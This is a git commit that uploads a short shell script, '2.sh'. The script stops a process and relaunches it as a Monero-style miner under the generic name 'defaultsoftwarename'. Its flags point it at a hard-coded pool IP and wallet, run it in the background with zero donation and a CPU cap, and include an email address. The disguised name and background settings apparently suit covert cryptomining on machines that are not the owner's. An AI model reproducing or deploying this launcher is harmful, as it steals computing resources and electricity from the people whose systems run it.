591c040da7e128bbc63ed01d2940887d691faf28
googl5 <65433622+googl5@users.noreply.github.com>
2020-06-15 06:46:43 +0300

    Add files via upload

---
+++ 2.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 45.134.254.83:44451 -u 85p5pDbnrxkag96ZC646M1Ev9iY9tQWjA8Aq9y5WD5E6guVjmQt9AfGDhEVszYLYVeNdmYeJSLnVTCKuwC1cSJUBUvcnPNY --pass=x:merkor233@yandex.com --rig-id=06 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
